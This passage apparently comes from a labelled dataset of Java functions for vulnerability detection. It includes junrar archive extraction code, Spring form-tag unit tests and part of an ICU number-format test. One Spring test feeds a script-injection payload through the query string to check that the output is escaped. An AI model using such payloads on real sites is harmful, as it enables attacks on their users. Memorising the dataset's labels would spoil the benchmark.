{\n\t\t\t\t} finally {\n\t\t\t\t\ttry {\n\t\t\t\t\t\tout.close();\n\t\t\t\t\t} catch (IOException e) {\n\t\t\t\t\t}\n\t\t\t\t}\n\t\t\t}\n\t\t}).start();\n\n\t\treturn in;\n\t}\n\n\tprivate void doExtractFile(FileHeader hd, OutputStream os)\n\t\t\tthrows RarException, IOException {\n\t\tdataIO.init(os);\n\t\tdataIO.init(hd);\n\t\tdataIO.setUnpFileCRC(this.isOldFormat() ? 0 : 0xffFFffFF);\n\t\tif (unpack == null) {\n\t\t\tunpack = new Unpack(dataIO);\n\t\t}\n\t\tif (!hd.isSolid()) {\n\t\t\tunpack.init(null);\n\t\t}\n\t\tunpack.setDestSize(hd.getFullUnpackSize());\n\t\ttry {\n\t\t\tunpack.doUnpack(hd.getUnpVersion(), hd.isSolid());\n\t\t\t// Verify file CRC\n\t\t\thd = dataIO.getSubHeader();\n\t\t\tlong actualCRC = hd.isSplitAfter() ? ~dataIO.getPackedCRC()\n\t\t\t\t\t: ~dataIO.getUnpFileCRC();\n\t\t\tint expectedCRC = hd.getFileCRC();\n\t\t\tif (actualCRC != expectedCRC) {\n\t\t\t\tthrow new RarException(RarExceptionType.crcError);\n\t\t\t}\n\t\t\t// if (!hd.isSplitAfter()) {\n\t\t\t// // Verify file CRC\n\t\t\t// if(~dataIO.getUnpFileCRC() != hd.getFileCRC()){\n\t\t\t// throw new RarException(RarExceptionType.crcError);\n\t\t\t// }\n\t\t\t// }\n\t\t} catch (Exception e) {\n\t\t\tunpack.cleanUp();\n\t\t\tif (e instanceof RarException) {\n\t\t\t\t// throw new RarException((RarException)e);\n\t\t\t\tthrow (RarException) e;\n\t\t\t} else {\n\t\t\t\tthrow new RarException(e);\n\t\t\t}\n\t\t}\n\t}\n\n\t/**\n\t * @return returns the main header of this archive\n\t */\n\tpublic MainHeader getMainHeader() {\n\t\treturn newMhd;\n\t}\n\n\t/**\n\t * @return whether the archive is old format\n\t */\n\tpublic boolean isOldFormat() {\n\t\treturn markHead.isOldFormat();\n\t}\n\n\t/** Close the underlying compressed file. */\n\tpublic void close() throws IOException {\n\t\tif (rof != null) {\n\t\t\trof.close();\n\t\t\trof = null;\n\t\t}\n\t\tif (unpack != null) {\n\t\t\tunpack.cleanUp();\n\t\t}\n\t}\n\n\t/**\n\t * @return the volumeManager\n\t */\n\tpublic VolumeManager getVolumeManager() {\n\t\treturn volumeManager;\n\t}\n\n\t/**\n\t * @param volumeManager\n\t *            the volumeManager to set\n\t */\n\tpublic void setVolumeManager(VolumeManager volumeManager) {\n\t\tthis.volumeManager = volumeManager;\n\t}\n\n\t/**\n\t * @return the volume\n\t */\n\tpublic Volume getVolume() {\n\t\treturn volume;\n\t}\n\n\t/**\n\t * @param volume\n\t *            the volume to set\n\t * @throws IOException\n\t */\n\tpublic void setVolume(Volume volume) throws IOException {\n\t\tthis.volume = volume;\n\t\tsetFile(volume.getReadOnlyAccess(), volume.getLength());\n\t}\n}\n", "target": 0}
{"idx": 1082, "func": "/*\n * Copyright 2002-2014 the original author or authors.\n *\n * Licensed under the Apache License, Version 2.0 (the \"License\");\n * you may not use this file except in compliance with the License.\n * You may obtain a copy of the License at\n *\n *      http://www.apache.org/licenses/LICENSE-2.0\n *\n * Unless required by applicable law or agreed to in writing, software\n * distributed under the License is distributed on an \"AS IS\" BASIS,\n * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n * See the License for the specific language governing permissions and\n * limitations under the License.\n */\n\npackage org.springframework.web.servlet.tags.form;\n\nimport java.util.Collections;\n\nimport javax.servlet.jsp.PageContext;\nimport javax.servlet.jsp.tagext.Tag;\n\nimport org.springframework.mock.web.test.MockHttpServletRequest;\nimport org.springframework.web.servlet.support.RequestDataValueProcessor;\n\nimport static org.mockito.BDDMockito.*;\n\n/**\n * @author Rob Harrop\n * @author Rick Evans\n * @author Juergen Hoeller\n * @author Scott Andrews\n * @author Jeremy Grelle\n * @author Rossen Stoyanchev\n */\npublic class FormTagTests extends AbstractHtmlElementTagTests {\n\n\tprivate static final String REQUEST_URI = \"/my/form\";\n\n\tprivate static final String QUERY_STRING = \"foo=bar\";\n\n\n\tprivate FormTag tag;\n\n\tprivate MockHttpServletRequest request;\n\n\n\t@Override\n\t@SuppressWarnings(\"serial\")\n\tprotected void onSetUp() {\n\t\tthis.tag = new FormTag() {\n\t\t\t@Override\n\t\t\tprotected TagWriter createTagWriter() {\n\t\t\t\treturn new TagWriter(getWriter());\n\t\t\t}\n\t\t};\n\t\tthis.tag.setPageContext(getPageContext());\n\t}\n\n\t@Override\n\tprotected void extendRequest(MockHttpServletRequest request) {\n\t\trequest.setRequestURI(REQUEST_URI);\n\t\trequest.setQueryString(QUERY_STRING);\n\t\tthis.request = request;\n\t}\n\n\tpublic void testWriteForm() throws Exception {\n\t\tString commandName = \"myCommand\";\n\t\tString name = \"formName\";\n\t\tString action = \"/form.html\";\n\t\tString method = \"POST\";\n\t\tString target = \"myTarget\";\n\t\tString enctype = \"my/enctype\";\n\t\tString acceptCharset = \"iso-8859-1\";\n\t\tString onsubmit = \"onsubmit\";\n\t\tString onreset = \"onreset\";\n\t\tString autocomplete = \"off\";\n\t\tString cssClass = \"myClass\";\n\t\tString cssStyle = \"myStyle\";\n\t\tString dynamicAttribute1 = \"attr1\";\n\t\tString dynamicAttribute2 = \"attr2\";\n\n\t\tthis.tag.setName(name);\n\t\tthis.tag.setCssClass(cssClass);\n\t\tthis.tag.setCssStyle(cssStyle);\n\t\tthis.tag.setCommandName(commandName);\n\t\tthis.tag.setAction(action);\n\t\tthis.tag.setMethod(method);\n\t\tthis.tag.setTarget(target);\n\t\tthis.tag.setEnctype(enctype);\n\t\tthis.tag.setAcceptCharset(acceptCharset);\n\t\tthis.tag.setOnsubmit(onsubmit);\n\t\tthis.tag.setOnreset(onreset);\n\t\tthis.tag.setAutocomplete(autocomplete);\n\t\tthis.tag.setDynamicAttribute(null, dynamicAttribute1, dynamicAttribute1);\n\t\tthis.tag.setDynamicAttribute(null, dynamicAttribute2, dynamicAttribute2);\n\n\t\tint result = this.tag.doStartTag();\n\t\tassertEquals(Tag.EVAL_BODY_INCLUDE, result);\n\t\tassertEquals(\"Form attribute not exposed\", commandName,\n\t\t\t\tgetPageContext().getRequest().getAttribute(FormTag.MODEL_ATTRIBUTE_VARIABLE_NAME));\n\n\t\tresult = this.tag.doEndTag();\n\t\tassertEquals(Tag.EVAL_PAGE, result);\n\n\t\tthis.tag.doFinally();\n\t\tassertNull(\"Form attribute not cleared after tag ends\",\n\t\t\t\tgetPageContext().getRequest().getAttribute(FormTag.MODEL_ATTRIBUTE_VARIABLE_NAME));\n\n\t\tString output = getOutput();\n\t\tassertFormTagOpened(output);\n\t\tassertFormTagClosed(output);\n\n\t\tassertContainsAttribute(output, \"class\", cssClass);\n\t\tassertContainsAttribute(output, \"style\", cssStyle);\n\t\tassertContainsAttribute(output, \"action\", action);\n\t\tassertContainsAttribute(output, \"method\", method);\n\t\tassertContainsAttribute(output, \"target\", target);\n\t\tassertContainsAttribute(output, \"enctype\", enctype);\n\t\tassertContainsAttribute(output, \"accept-charset\", acceptCharset);\n\t\tassertContainsAttribute(output, \"onsubmit\", onsubmit);\n\t\tassertContainsAttribute(output, \"onreset\", onreset);\n\t\tassertContainsAttribute(output, \"autocomplete\", autocomplete);\n\t\tassertContainsAttribute(output, \"id\", commandName);\n\t\tassertContainsAttribute(output, \"name\", name);\n\t\tassertContainsAttribute(output, dynamicAttribute1, dynamicAttribute1);\n\t\tassertContainsAttribute(output, dynamicAttribute2, dynamicAttribute2);\n\t}\n\n\tpublic void testWithActionFromRequest() throws Exception {\n\t\tString commandName = \"myCommand\";\n\t\tString enctype = \"my/enctype\";\n\t\tString method = \"POST\";\n\t\tString onsubmit = \"onsubmit\";\n\t\tString onreset = \"onreset\";\n\n\t\tthis.tag.setCommandName(commandName);\n\t\tthis.tag.setMethod(method);\n\t\tthis.tag.setEnctype(enctype);\n\t\tthis.tag.setOnsubmit(onsubmit);\n\t\tthis.tag.setOnreset(onreset);\n\n\t\tint result = this.tag.doStartTag();\n\t\tassertEquals(Tag.EVAL_BODY_INCLUDE, result);\n\t\tassertEquals(\"Form attribute not exposed\", commandName,\n\t\t\t\tgetPageContext().getAttribute(FormTag.MODEL_ATTRIBUTE_VARIABLE_NAME, PageContext.REQUEST_SCOPE));\n\n\t\tresult = this.tag.doEndTag();\n\t\tassertEquals(Tag.EVAL_PAGE, result);\n\n\t\tthis.tag.doFinally();\n\t\tassertNull(\"Form attribute not cleared after tag ends\",\n\t\t\t\tgetPageContext().getAttribute(FormTag.MODEL_ATTRIBUTE_VARIABLE_NAME, PageContext.REQUEST_SCOPE));\n\n\t\tString output = getOutput();\n\t\tassertFormTagOpened(output);\n\t\tassertFormTagClosed(output);\n\n\t\tassertContainsAttribute(output, \"action\", REQUEST_URI + \"?\" + QUERY_STRING);\n\t\tassertContainsAttribute(output, \"method\", method);\n\t\tassertContainsAttribute(output, \"enctype\", enctype);\n\t\tassertContainsAttribute(output, \"onsubmit\", onsubmit);\n\t\tassertContainsAttribute(output, \"onreset\", onreset);\n\t\tassertAttributeNotPresent(output, \"name\");\n\t}\n\n\tpublic void testPrependServletPath() throws Exception {\n\n\t\tthis.request.setContextPath(\"/myApp\");\n\t\tthis.request.setServletPath(\"/main\");\n\t\tthis.request.setPathInfo(\"/index.html\");\n\n\t\tString commandName = \"myCommand\";\n\t\tString action = \"/form.html\";\n\t\tString enctype = \"my/enctype\";\n\t\tString method = \"POST\";\n\t\tString onsubmit = \"onsubmit\";\n\t\tString onreset = \"onreset\";\n\n\t\tthis.tag.setCommandName(commandName);\n\t\tthis.tag.setServletRelativeAction(action);\n\t\tthis.tag.setMethod(method);\n\t\tthis.tag.setEnctype(enctype);\n\t\tthis.tag.setOnsubmit(onsubmit);\n\t\tthis.tag.setOnreset(onreset);\n\n\t\tint result = this.tag.doStartTag();\n\t\tassertEquals(Tag.EVAL_BODY_INCLUDE, result);\n\t\tassertEquals(\"Form attribute not exposed\", commandName,\n\t\t\t\tgetPageContext().getAttribute(FormTag.MODEL_ATTRIBUTE_VARIABLE_NAME, PageContext.REQUEST_SCOPE));\n\n\t\tresult = this.tag.doEndTag();\n\t\tassertEquals(Tag.EVAL_PAGE, result);\n\n\t\tthis.tag.doFinally();\n\t\tassertNull(\"Form attribute not cleared after tag ends\",\n\t\t\t\tgetPageContext().getAttribute(FormTag.MODEL_ATTRIBUTE_VARIABLE_NAME, PageContext.REQUEST_SCOPE));\n\n\t\tString output = getOutput();\n\t\tassertFormTagOpened(output);\n\t\tassertFormTagClosed(output);\n\n\t\tassertContainsAttribute(output, \"action\", \"/myApp/main/form.html\");\n\t\tassertContainsAttribute(output, \"method\", method);\n\t\tassertContainsAttribute(output, \"enctype\", enctype);\n\t\tassertContainsAttribute(output, \"onsubmit\", onsubmit);\n\t\tassertContainsAttribute(output, \"onreset\", onreset);\n\t\tassertAttributeNotPresent(output, \"name\");\n\t}\n\n\tpublic void testWithNullResolvedCommand() throws Exception {\n\t\ttry {\n\t\t\ttag.setCommandName(null);\n\t\t\ttag.doStartTag();\n\t\t\tfail(\"Must not be able to have a command name that resolves to null\");\n\t\t}\n\t\tcatch (IllegalArgumentException ex) {\n\t\t\t// expected\n\t\t}\n\t}\n\n\t/*\n\t * See http://opensource.atlassian.com/projects/spring/browse/SPR-2645\n\t */\n\tpublic void testXSSScriptingExploitWhenActionIsResolvedFromQueryString() throws Exception {\n\t\tString xssQueryString = QUERY_STRING + \"&stuff=\\\"><script>alert('XSS!')</script>\";\n\t\trequest.setQueryString(xssQueryString);\n\t\ttag.doStartTag();\n\t\tassertEquals(\"<form id=\\\"command\\\" action=\\\"/my/form?foo=bar&amp;stuff=&quot;&gt;&lt;script&gt;alert(&#39;XSS!&#39;)&lt;/script&gt;\\\" method=\\\"post\\\">\",\n\t\t\t\tgetOutput());\n\t}\n\n\tpublic void testGet() throws Exception {\n\t\tthis.tag.setMethod(\"get\");\n\n\t\tthis.tag.doStartTag();\n\t\tthis.tag.doEndTag();\n\t\tthis.tag.doFinally();\n\n\t\tString output = getOutput();\n\t\tString formOutput = getFormTag(output);\n\t\tString inputOutput = getInputTag(output);\n\n\t\tassertContainsAttribute(formOutput, \"method\", \"get\");\n\t\tassertEquals(\"\", inputOutput);\n\t}\n\n\tpublic void testPost() throws Exception {\n\t\tthis.tag.setMethod(\"post\");\n\n\t\tthis.tag.doStartTag();\n\t\tthis.tag.doEndTag();\n\t\tthis.tag.doFinally();\n\n\t\tString output = getOutput();\n\t\tString formOutput = getFormTag(output);\n\t\tString inputOutput = getInputTag(output);\n\n\t\tassertContainsAttribute(formOutput, \"method\", \"post\");\n\t\tassertEquals(\"\", inputOutput);\n\t}\n\n\tpublic void testPut() throws Exception {\n\t\tthis.tag.setMethod(\"put\");\n\n\t\tthis.tag.doStartTag();\n\t\tthis.tag.doEndTag();\n\t\tthis.tag.doFinally();\n\n\t\tString output = getOutput();\n\t\tString formOutput = getFormTag(output);\n\t\tString inputOutput = getInputTag(output);\n\n\t\tassertContainsAttribute(formOutput, \"method\", \"post\");\n\t\tassertContainsAttribute(inputOutput, \"name\", \"_method\");\n\t\tassertContainsAttribute(inputOutput, \"value\", \"put\");\n\t\tassertContainsAttribute(inputOutput, \"type\", \"hidden\");\n\t}\n\n\tpublic void testDelete() throws Exception {\n\t\tthis.tag.setMethod(\"delete\");\n\n\t\tthis.tag.doStartTag();\n\t\tthis.tag.doEndTag();\n\t\tthis.tag.doFinally();\n\n\t\tString output = getOutput();\n\t\tString formOutput = getFormTag(output);\n\t\tString inputOutput = getInputTag(output);\n\n\t\tassertContainsAttribute(formOutput, \"method\", \"post\");\n\t\tassertContainsAttribute(inputOutput, \"name\", \"_method\");\n\t\tassertContainsAttribute(inputOutput, \"value\", \"delete\");\n\t\tassertContainsAttribute(inputOutput, \"type\", \"hidden\");\n\t}\n\n\tpublic void testCustomMethodParameter() throws Exception {\n\t\tthis.tag.setMethod(\"put\");\n\t\tthis.tag.setMethodParam(\"methodParameter\");\n\n\t\tthis.tag.doStartTag();\n\t\tthis.tag.doEndTag();\n\t\tthis.tag.doFinally();\n\n\t\tString output = getOutput();\n\t\tString formOutput = getFormTag(output);\n\t\tString inputOutput = getInputTag(output);\n\n\t\tassertContainsAttribute(formOutput, \"method\", \"post\");\n\t\tassertContainsAttribute(inputOutput, \"name\", \"methodParameter\");\n\t\tassertContainsAttribute(inputOutput, \"value\", \"put\");\n\t\tassertContainsAttribute(inputOutput, \"type\", \"hidden\");\n\t}\n\n\tpublic void testClearAttributesOnFinally() throws Exception {\n\t\tthis.tag.setModelAttribute(\"model\");\n\t\tgetPageContext().setAttribute(\"model\", \"foo bar\");\n\t\tassertNull(getPageContext().getAttribute(FormTag.MODEL_ATTRIBUTE_VARIABLE_NAME, PageContext.REQUEST_SCOPE));\n\t\tthis.tag.doStartTag();\n\t\tassertNotNull(getPageContext().getAttribute(FormTag.MODEL_ATTRIBUTE_VARIABLE_NAME, PageContext.REQUEST_SCOPE));\n\t\tthis.tag.doFinally();\n\t\tassertNull(getPageContext().getAttribute(FormTag.MODEL_ATTRIBUTE_VARIABLE_NAME, PageContext.REQUEST_SCOPE));\n\t}\n\n\tpublic void testRequestDataValueProcessorHooks() throws Exception {\n\t\tString action = \"/my/form?foo=bar\";\n\t\tRequestDataValueProcessor processor = getMockRequestDataValueProcessor();\n\t\tgiven(processor.processAction(this.request, action, \"post\")).willReturn(action);\n\t\tgiven(processor.getExtraHiddenFields(this.request)).willReturn(Collections.singletonMap(\"key\", \"value\"));\n\n\t\tthis.tag.doStartTag();\n\t\tthis.tag.doEndTag();\n\t\tthis.tag.doFinally();\n\n\t\tString output = getOutput();\n\n\t\tassertEquals(\"<div>\\n<input type=\\\"hidden\\\" name=\\\"key\\\" value=\\\"value\\\" />\\n</div>\", getInputTag(output));\n\t\tassertFormTagOpened(output);\n\t\tassertFormTagClosed(output);\n\t}\n\n\tpublic void testDefaultActionEncoded() throws Exception {\n\n\t\tthis.request.setRequestURI(\"/a b c\");\n\t\trequest.setQueryString(\"\");\n\n\t\tthis.tag.doStartTag();\n\t\tthis.tag.doEndTag();\n\t\tthis.tag.doFinally();\n\n\t\tString output = getOutput();\n\t\tString formOutput = getFormTag(output);\n\n\t\tassertContainsAttribute(formOutput, \"action\", \"/a%20b%20c\");\n\t}\n\n\tprivate String getFormTag(String output) {\n\t\tint inputStart = output.indexOf(\"<\", 1);\n\t\tint inputEnd = output.lastIndexOf(\">\", output.length() - 2);\n\t\treturn output.substring(0, inputStart) + output.substring(inputEnd + 1);\n\t}\n\n\tprivate String getInputTag(String output) {\n\t\tint inputStart = output.indexOf(\"<\", 1);\n\t\tint inputEnd = output.lastIndexOf(\">\", output.length() - 2);\n\t\treturn output.substring(inputStart, inputEnd + 1);\n\t}\n\n\n\tprivate static void assertFormTagOpened(String output) {\n\t\tassertTrue(output.startsWith(\"<form \"));\n\t}\n\n\tprivate static void assertFormTagClosed(String output) {\n\t\tassertTrue(output.endsWith(\"</form>\"));\n\t}\n\n}\n", "target": 0}
{"idx": 1083, "func": "// © 2016 and later: Unicode, Inc. and others.\n// License & terms of use: http://www.unicode.org/copyright.html#License\n/*\n *******************************************************************************\n * Copyright (C) 2001-2016, International Business Machines Corporation and\n * others. All Rights Reserved.\n *******************************************************************************\n */\n\n/**\n * Port From:   ICU4C v1.8.1 : format : NumberFormatTest\n * Source File: $ICU4oot/source/test/intltest/numfmtst.cpp\n **/\n\npackage com.ibm.icu.dev.test.format;\n\nimport java.io.ByteArrayInputStream;\nimport java.io.ByteArrayOutputStream;\nimport java.io.IOException;\nimport java.io.ObjectInputStream;\nimport java.io.ObjectOutputStream;\nimport java.lang.reflect.InvocationTargetException;\nimport java.lang.reflect.Method;\nimport java.math.BigInteger;\nimport java.math.RoundingMode;\nimport java.text.AttributedCharacterIterator;\nimport java.text.FieldPosition;\nimport java.text.Format;\nimport java.text.ParseException;\nimport java.text.ParsePosition;\nimport java.util.ArrayList;\nimport java.util.Iterator;\nimport java.util.List;\nimport java.util.Locale;\nimport java.util.Random;\nimport java.util.Set;\n\nimport org.junit.Ignore;\nimport org.junit.Test;\nimport org.junit.runner.RunWith;\nimport org.junit.runners.JUnit4;\n\nimport com.ibm.icu.dev.test.TestFmwk;\nimport com.ibm.icu.dev.test.TestUtil;\nimport com.ibm.icu.dev.test.format.IntlTestDecimalFormatAPIC.FieldContainer;\nimport com.ibm.icu.dev.text.DecimalFormat_ICU58;\nimport com.ibm.icu.impl.ICUConfig;\nimport com.ibm.icu.impl.LocaleUtility;\nimport com.ibm.icu.impl.data.ResourceReader;\nimport com.ibm.icu.impl.data.TokenIterator;\nimport com.ibm.icu.math.BigDecimal;\nimport com.ibm.icu.math.MathContext;\nimport com.ibm.icu.text.CompactDecimalFormat;\nimport com.ibm.icu.text.CurrencyPluralInfo;\nimport com.ibm.icu.text.DecimalFormat;\nimport com.ibm.icu.text.DecimalFormatSymbols;\nimport com.ibm.icu.text.DisplayContext;\nimport com.ibm.icu.text.MeasureFormat;\nimport com.ibm.icu.text.NumberFormat;\nimport com.ibm.icu.text.NumberFormat.NumberFormatFactory;\nimport com.ibm.icu.text.NumberFormat.SimpleNumberFormatFactory;\nimport com.ibm.icu.text.NumberingSystem;\nimport com.ibm.icu.text.RuleBasedNumberFormat;\nimport com.ibm.icu.text.UnicodeSet;\nimport com.ibm.icu.util.Currency;\nimport com.ibm.icu.util.Currency.CurrencyUsage;\nimport com.ibm.icu.util.CurrencyAmount;\nimport com.ibm.icu.util.ULocale;\n\n@RunWith(JUnit4.class)\npublic class NumberFormatTest extends TestFmwk {\n\n    @Test\n    public void TestRoundingScientific10542() {\n        DecimalFormat format =\n                new DecimalFormat(\"0.00E0\");\n\n        int[] roundingModes = {\n              BigDecimal.ROUND_CEILING,\n              BigDecimal.ROUND_DOWN,\n              BigDecimal.ROUND_FLOOR,\n              BigDecimal.ROUND_HALF_DOWN,\n              BigDecimal.ROUND_HALF_EVEN,\n              BigDecimal.ROUND_HALF_UP,\n              BigDecimal.ROUND_UP};\n        String[] descriptions = {\n                \"Round Ceiling\",\n                \"Round Down\",\n                \"Round Floor\",\n                \"Round half down\",\n                \"Round half even\",\n                \"Round half up\",\n                \"Round up\"};\n\n        double[] values = {-0.003006, -0.003005, -0.003004, 0.003014, 0.003015, 0.003016};\n        // The order of these expected values correspond to the order of roundingModes and the order of values.\n        String[][] expected = {\n                {\"-3.00E-3\", \"-3.00E-3\", \"-3.00E-3\", \"3.02E-3\", \"3.02E-3\", \"3.02E-3\"},\n                {\"-3.00E-3\", \"-3.00E-3\", \"-3.00E-3\", \"3.01E-3\", \"3.01E-3\", \"3.01E-3\"},\n                {\"-3.01E-3\", \"-3.01E-3\", \"-3.01E-3\", \"3.01E-3\", \"3.01E-3\", \"3.01E-3\"},\n                {\"-3.01E-3\", \"-3.00E-3\", \"-3.00E-3\", \"3.01E-3\", \"3.01E-3\", \"3.02E-3\"},\n                {\"-3.01E-3\", \"-3.00E-3\", \"-3.00E-3\", \"3.01E-3\", \"3.02E-3\", \"3.02E-3\"},\n                {\"-3.01E-3\", \"-3.01E-3\", \"-3.00E-3\", \"3.01E-3\", \"3.02E-3\", \"3.02E-3\"},\n                {\"-3.01E-3\", \"-3.01E-3\", \"-3.01E-3\", \"3.02E-3\", \"3.02E-3\", \"3.02E-3\"}};\n        verifyRounding(format, values, expected, roundingModes, descriptions);\n        values = new double[]{-3006.0, -3005, -3004, 3014, 3015, 3016};\n        // The order of these expected values correspond to the order of roundingModes and the order of values.\n        expected = new String[][]{\n                {\"-3.00E3\", \"-3.00E3\", \"-3.00E3\", \"3.02E3\", \"3.02E3\", \"3.02E3\"},\n                {\"-3.00E3\", \"-3.00E3\", \"-3.00E3\", \"3.01E3\", \"3.01E3\", \"3.01E3\"},\n                {\"-3.01E3\", \"-3.01E3\", \"-3.01E3\", \"3.01E3\", \"3.01E3\", \"3.01E3\"},\n                {\"-3.01E3\", \"-3.00E3\", \"-3.00E3\", \"3.01E3\", \"3.01E3\", \"3.02E3\"},\n                {\"-3.01E3\", \"-3.00E3\", \"-3.00E3\", \"3.01E3\", \"3.02E3\", \"3.02E3\"},\n                {\"-3.01E3\", \"-3.01E3\", \"-3.00E3\", \"3.01E3\", \"3.02E3\", \"3.02E3\"},\n                {\"-3.01E3\", \"-3.01E3\", \"-3.01E3\", \"3.02E3\", \"3.02E3\", \"3.02E3\"}};\n        verifyRounding(format, values, expected, roundingModes, descriptions);\n        values = new double[]{0.0, -0.0};\n        // The order of these expected values correspond to the order of roundingModes and the order of values.\n        expected = new String[][]{\n                {\"0.00E0\", \"-0.00E0\"},\n                {\"0.00E0\", \"-0.00E0\"},\n                {\"0.00E0\", \"-0.00E0\"},\n                {\"0.00E0\", \"-0.00E0\"},\n                {\"0.00E0\", \"-0.00E0\"},\n                {\"0.00E0\", \"-0.00E0\"},\n                {\"0.00E0\", \"-0.00E0\"}};\n        verifyRounding(format, values, expected, roundingModes, descriptions);\n        values = new double[]{1e25, 1e25 + 1e15, 1e25 - 1e15};\n        // The order of these expected values correspond to the order of roundingModes and the order of values.\n        expected = new String[][]{\n                {\"1.00E25\", \"1.01E25\", \"1.00E25\"},\n                {\"1.00E25\", \"1.00E25\", \"9.99E24\"},\n                {\"1.00E25\", \"1.00E25\", \"9.99E24\"},\n                {\"1.00E25\", \"1.00E25\", \"1.00E25\"},\n                {\"1.00E25\", \"1.00E25\", \"1.00E25\"},\n                {\"1.00E25\", \"1.00E25\", \"1.00E25\"},\n                {\"1.00E25\", \"1.01E25\", \"1.00E25\"}};\n        verifyRounding(format, values, expected, roundingModes, descriptions);\n        values = new double[]{-1e25, -1e25 + 1e15, -1e25 - 1e15};\n        // The order of these expected values correspond to the order of roundingModes and the order of values.\n        expected = new String[][]{\n                {\"-1.00E25\", \"-9.99E24\", \"-1.00E25\"},\n                {\"-1.00E25\", \"-9.99E24\", \"-1.00E25\"},\n                {\"-1.00E25\", \"-1.00E25\", \"-1.01E25\"},\n                {\"-1.00E25\", \"-1.00E25\", \"-1.00E25\"},\n                {\"-1.00E25\", \"-1.00E25\", \"-1.00E25\"},\n                {\"-1.00E25\", \"-1.00E25\", \"-1.00E25\"},\n                {\"-1.00E25\", \"-1.00E25\", \"-1.01E25\"}};\n        verifyRounding(format, values, expected, roundingModes, descriptions);\n        values = new double[]{1e-25, 1e-25 + 1e-35, 1e-25 - 1e-35};\n        // The order of these expected values correspond to the order of roundingModes and the order of values.\n        expected = new String[][]{\n                {\"1.00E-25\", \"1.01E-25\", \"1.00E-25\"},\n                {\"1.00E-25\", \"1.00E-25\", \"9.99E-26\"},\n                {\"1.00E-25\", \"1.00E-25\", \"9.99E-26\"},\n                {\"1.00E-25\", \"1.00E-25\", \"1.00E-25\"},\n                {\"1.00E-25\", \"1.00E-25\", \"1.00E-25\"},\n                {\"1.00E-25\", \"1.00E-25\", \"1.00E-25\"},\n                {\"1.00E-25\", \"1.01E-25\", \"1.00E-25\"}};\n        verifyRounding(format, values, expected, roundingModes, descriptions);\n        values = new double[]{-1e-25, -1e-25 + 1e-35, -1e-25 - 1e-35};\n        // The order of these expected values correspond to the order of roundingModes and the order of values.\n        expected = new String[][]{\n                {\"-1.00E-25\", \"-9.99E-26\", \"-1.00E-25\"},\n                {\"-1.00E-25\", \"-9.99E-26\", \"-1.00E-25\"},\n                {\"-1.00E-25\", \"-1.00E-25\", \"-1.01E-25\"},\n                {\"-1.00E-25\", \"-1.00E-25\", \"-1.00E-25\"},\n                {\"-1.00E-25\", \"-1.00E-25\", \"-1.00E-25\"},\n                {\"-1.00E-25\", \"-1.00E-25\", \"-1.00E-25\"},\n                {\"-1.00E-25\", \"-1.00E-25\", \"-1.01E-25\"}};\n        verifyRounding(format, values, expected, roundingModes, descriptions);\n    }\n\n    private void verifyRounding(DecimalFormat format, double[] values, String[][] expected, int[] roundingModes,\n            String[] descriptions) {\n        for (int i = 0; i < roundingModes.length; i++) {\n            format.setRoundingMode(roundingModes[i]);\n            for (int j = 0; j < values.length; j++) {\n                assertEquals(descriptions[i]+\" \" +values[j], expected[i][j], format.format(values[j]));\n            }\n        }\n    }\n\n    @Test\n    public void Test10419RoundingWith0FractionDigits() {\n        Object[][] data = new Object[][]{\n                {BigDecimal.ROUND_CEILING, 1.488, \"2\"},\n                {BigDecimal.ROUND_DOWN, 1.588, \"1\"},\n                {BigDecimal.ROUND_FLOOR, 1.588, \"1\"},\n                {BigDecimal.ROUND_HALF_DOWN, 1.5, \"1\"},\n                {BigDecimal.ROUND_HALF_EVEN, 2.5, \"2\"},\n                {BigDecimal.ROUND_HALF_UP, 2.5, \"3\"},\n                {BigDecimal.ROUND_UP, 1.5, \"2\"},\n        };\n        NumberFormat nff = NumberFormat.getNumberInstance(ULocale.ENGLISH);\n        nff.setMaximumFractionDigits(0);\n        for (Object[] item : data) {\n          nff.setRoundingMode(((Integer) item[0]).intValue());\n          assertEquals(\"Test10419\", item[2], nff.format(item[1]));\n        }\n    }\n\n    @Test\n    public void TestParseNegativeWithFaLocale() {\n        DecimalFormat parser = (DecimalFormat) NumberFormat.getInstance(new ULocale(\"fa\"));\n        try {\n            double value = parser.parse(\"-0,5\").doubleValue();\n            assertEquals(\"Expect -0.5\", -0.5, value);\n        } catch (ParseException e) {\n            TestFmwk.errln(\"Parsing -0.5 should have succeeded.\");\n        }\n    }\n\n    @Test\n    public void TestParseNegativeWithAlternativeMinusSign() {\n        DecimalFormat parser = (DecimalFormat) NumberFormat.getInstance(new ULocale(\"en\"));\n        try {\n            double value = parser.parse(\"\\u208B0.5\").doubleValue();\n            assertEquals(\"Expect -0.5\", -0.5, value);\n        } catch (ParseException e) {\n            TestFmwk.errln(\"Parsing -0.5 should have succeeded.\");\n        }\n    }\n\n    // Test various patterns\n    @Test\n    public void TestPatterns() {\n\n        DecimalFormatSymbols sym = new DecimalFormatSymbols(Locale.US);\n        final String pat[]    = { \"#.#\", \"#.\", \".#\", \"#\" };\n        int pat_length = pat.length;\n        final String newpat[] = { \"0.#\", \"0.\", \"#.0\", \"0\" };\n        final String num[]    = { \"0\",   \"0.\", \".0\", \"0\" };\n        for (int i=0; i<pat_length; ++i)\n        {\n            DecimalFormat fmt = new DecimalFormat(pat[i], sym);\n            String newp = fmt.toPattern();\n            if (!newp.equals(newpat[i]))\n                errln(\"FAIL: Pattern \" + pat[i] + \" should transmute to \" + newpat[i] +\n                        \"; \" + newp + \" seen instead\");\n\n            String s = ((NumberFormat)fmt).format(0);\n            if (!s.equals(num[i]))\n            {\n                errln(\"FAIL: Pattern \" + pat[i] + \" should format zero as \" + num[i] +\n                        \"; \" + s + \" seen instead\");\n                logln(\"Min integer digits = \" + fmt.getMinimumIntegerDigits());\n            }\n            // BigInteger 0 - ticket#4731\n            s = ((NumberFormat)fmt).format(BigInteger.ZERO);\n            if (!s.equals(num[i]))\n            {\n                errln(\"FAIL: Pattern \" + pat[i] + \" should format BigInteger zero as \" + num[i] +\n                        \"; \" + s + \" seen instead\");\n                logln(\"Min integer digits = \" + fmt.getMinimumIntegerDigits());\n            }\n        }\n    }\n\n    // Test exponential pattern\n    @Test\n    public void TestExponential() {\n\n        DecimalFormatSymbols sym = new DecimalFormatSymbols(Locale.US);\n        final String pat[] = { \"0.####E0\", \"00.000E00\", \"##0.######E000\", \"0.###E0;[0.###E0]\" };\n        int pat_length = pat.length;\n\n        double val[] = { 0.01234, 123456789, 1.23e300, -3.141592653e-271 };\n        int val_length = val.length;\n        final String valFormat[] = {\n                // 0.####E0\n                \"1.234E-2\", \"1.2346E8\", 